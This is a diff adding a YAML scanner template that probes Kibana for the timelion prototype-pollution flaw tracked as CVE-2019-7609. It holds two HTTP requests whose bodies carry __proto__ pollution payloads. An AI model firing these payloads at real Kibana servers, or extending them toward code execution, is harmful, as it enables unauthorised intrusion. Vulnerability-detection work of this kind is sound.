@@ -1,0 +1,27 @@
+name: poc-kibana-pp-rce
+transport: http
+set:
+  r0: randomInt(1000, 9999)
+rules:
+  r0:
+    request:
+      method: PUT
+      path: "/api/console/proxy?path=_template%2Ftest&method=put"
+      headers:
+        Content-Type: "application/json"
+      body: '{"template":"test","index_patterns":["__proto__"],"settings":{"__proto__":{"x":"{{r0}}"}}}'
+    expression: response.status == 200
+  r1:
+    request:
+      method: POST
+      path: "/api/timelion/run"
+      headers:
+        Content-Type: "application/json"
+      body: '{"sheet":["{{r0}}.es(*).props(label.__proto__.env.PWD.label=''{{r0}}'')"],"time":{"from":"now-1m","to":"now","mode":"quick"}}'
+    expression: response.status == 200 && response.body.bcontains("{{r0}}")
+expression: r0() && r1()
+detail:
+  author: sxel
+  description: Kibana prototype pollution to RCE probe (CVE-2019-7609, pre-auth timelion on affected versions)
+  severity: critical
+  tags: kibana,elastic,pp,rce
